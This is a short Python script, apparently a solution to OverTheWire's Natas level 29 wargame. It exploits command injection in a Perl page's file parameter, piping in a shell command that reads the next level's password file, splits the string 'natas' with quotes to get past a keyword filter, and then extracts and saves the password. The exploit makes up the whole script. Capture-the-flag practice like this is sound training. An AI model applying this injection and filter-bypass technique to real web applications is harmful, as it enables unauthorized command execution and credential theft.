import requests
import re
from natas_utility import *
import html

current_level = 29
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url

session = requests.session()

pwn_url = url + '/index.pl?file={}'.format('|cat+"/etc/nat""as_webpass/nat""as30"|tr+%27\n%27+%27+%27')

response = session.get(pwn_url, auth=auth)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n').replace('<br>', '\n')

password_regex = re.compile(r'</html>\n(.+) ')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
